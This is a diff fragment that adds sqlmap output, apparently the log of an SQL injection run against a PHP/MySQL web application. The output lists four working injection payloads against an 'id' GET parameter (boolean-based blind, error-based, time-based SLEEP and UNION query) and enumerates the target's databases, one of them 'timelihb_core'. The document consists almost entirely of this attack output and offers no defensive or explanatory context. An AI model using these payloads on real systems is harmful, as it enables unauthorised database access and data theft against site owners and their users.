@@ -73,3 +73,28 @@ available databases [2]:
 [*] information_schema
 [*] timelihb_core
 
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: id=382 RLIKE (SELECT (CASE WHEN (4672=4672) THEN 382 ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=382 OR (SELECT 6952 FROM(SELECT COUNT(*),CONCAT(0x716b7a7871,(SELECT (ELT(6952=6952,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=382 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=382 UNION ALL SELECT NULL,CONCAT(0x716b7a7871,0x45446c59637877436d46474768614548556a567151576c426d66725a6775474a696d685767654645,0x7170786a71),NULL,NULL,NULL-- GYQF
+---
+web application technology: Apache, PHP 5.5.30
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] timelihb_core
+
